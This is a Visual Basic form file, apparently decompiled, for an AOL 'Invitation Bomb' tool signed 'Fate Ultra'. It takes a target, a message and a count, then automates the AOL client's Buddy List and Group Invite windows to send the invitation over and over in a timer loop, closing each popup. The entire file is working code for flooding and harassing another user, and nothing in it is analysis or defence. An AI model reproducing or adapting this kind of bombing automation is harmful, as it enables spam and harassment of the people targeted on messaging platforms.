' INVITEBO.FRM
Option Explicit

Sub Command3D1_Click ()
Dim l002E As Variant
Dim l0034 As Variant
Dim l0038 As String
Dim l003C As Variant
If  Text1.Text = "" Then
MsgBox "There is nobody to Invitation Bomb!", 16
Exit Sub
End If
If  Text2.Text = "" Then
MsgBox "There is no message!", 16
Exit Sub
End If
If  Text3.Text = "" Then
MsgBox "Please enter in how many times you want to bomb!", 16
Exit Sub
End If
If  Not IsNumeric(Text3.Text) Then
MsgBox "Please enter in a numeric number for times to bomb!", 16
Exit Sub
End If
l002E = extfn1018("AOL FRAME25", 0&)
l0034 = extfn10F8(l002E, "Welcome")
l0038$ = String(30, 0)
l003C = extfnFA8(l0034, l0038$, 250)
If  l003C <= 7 Then
MsgBox "Not Signed On!", 16
Exit Sub
End If
If  Timer1.Interval = 0 Then
Command3D1.Caption = "Stop"
Timer1.Interval = 1
Else
Timer1.Interval = 0
Command3D1.Caption = "Start"
End If
End Sub

Sub Form_Load ()
MsgBox "Before using this, you must SETUP A BUDDY LIST. If you already have a buddy list setup, ignore this message. Afterwards you can use it.", 16
extsub1050 invitebo.hWnd, -1, 0, 0, 0, 0, 3
End Sub

Sub Timer1_Timer ()
Dim l0050 As Variant
Dim l0054 As Variant
Dim l0058 As Variant
Dim l005E As Variant
Dim l0062 As Variant
Dim l0068 As Variant
Dim l006E As Variant
Dim l0072 As Variant
Dim l0078 As Variant
Dim l007C As String
Dim l007E As Variant
Dim l0084 As Variant
Dim l0088 As Variant
Dim l008C As Variant
Dim l0090 As Variant
Dim l0096 As Variant
Dim l009A As Variant
Dim l009E As Variant
Dim l00A2 As Variant
Dim l00A6 As Variant
Dim l00AA As Variant
Dim l00AE As Variant
Dim l00B2 As Variant
Dim l00B6 As Variant
Dim l00BA As Variant
For l0050 = 1 To Text3.Text
If  Timer1.Interval = 0 Then GoTo L6F2A8
l0054 = extfn1018("AOL FRAME25", 0&)
l0058 = extfn10F8(l0054, "Buddy Lists")
If  l0058 = 0 Then
l005E = fn5D0("&Go To", "Keyword...")
30 :
DoEvents
l0062 = extfn10F8(l0054, "Keyword")
If  l0062 = 0 Then GoTo 30
l0068 = extfn10C0(l0062, "_AOL_EDIT")
l006E = extfn11A0(l0068, 12, 0, "buddy")
l0072 = extfn10C0(l0062, "_AOL_ICON")
l0078 = fn1480(l0072)
l0054 = extfn1018("AOL FRAME25", 0&)
l0058 = extfn10F8(l0054, "Welcome")
l007C$ = String(30, 0)
l0062 = extfnFA8(l0058, l007C$, 250)
l0068 = Mid(l007C$, 10, 10)
l006E = InStr(l0068, "!")
If  l006E Then
l0068 = Mid(l0068, 1, l006E - 1)
End If
34 :
DoEvents
l0072 = l0068 + "'s Buddy Lists"
l0078 = extfn10F8(l0054, l0072)
If  l0078 = 0 Then GoTo 34
l007E = extfn10C0(l0078, "_AOL_ICON")
l0084 = extfn1168(l007E, 2)
l0088 = extfn1168(l0084, 2)
l008C = extfn1168(l0088, 2)
l0090 = fn1480(l008C)
l0096 = extfnFE0(l0078, 16, 0, 0)
End If
56 :
DoEvents
l0058 = extfn10F8(l0054, "Buddy Lists")
If  l0058 = 0 Then GoTo 56
l005E = extfn10C0(l0058, "_AOL_ICON")
l0062 = extfn1168(l005E, 2)
l0068 = extfn1168(l0062, 2)
l006E = extfn1168(l0068, 2)
l0072 = fn1480(l006E)
10 :
DoEvents
If  Timer1.Interval = 0 Then GoTo L6F2A8
l0078 = extfn10F8(l0054, "Group Invite")
If  l0078 = 0 Then GoTo 10
l007E = extfn10C0(l0078, "_AOL_EDIT")
l0084 = extfn11A0(l007E, 12, 0, Text1.Text)
l0088 = extfn1168(l007E, 2)
l008C = extfn1168(l0088, 2)
l0090 = extfn11A0(l008C, 12, 0, Text2.Text)
l0096 = extfn10C0(l0078, "_AOL_ICON")
l009A = extfn1168(l0096, 2)
l009E = extfn1168(l009A, 3)
l00A2 = extfn1168(l009E, 3)
l00A6 = extfn1168(l00A2, 3)
l00AA = extfn11A0(l00A6, 12, 0, "- --Fate Ultra-- -")
l00AE = extfn10C0(l0078, "_AOL_ICON")
l00B2 = fn1480(l00AE)
20 :
DoEvents
l00B6 = extfn10F8(l0054, "Invitation from ")
If  Timer1.Interval = 0 Then GoTo L6F2A8
If  l00B6 = 0 Then GoTo 20
l00BA = extfnFE0(l00B6, 16, 0, 0)
If  Timer1.Interval = 0 Then GoTo L6F2A8
DoEvents
Next l0050
Command3D1.Caption = "Start"
Timer1.Interval = 0
L6F2A8:
End Sub
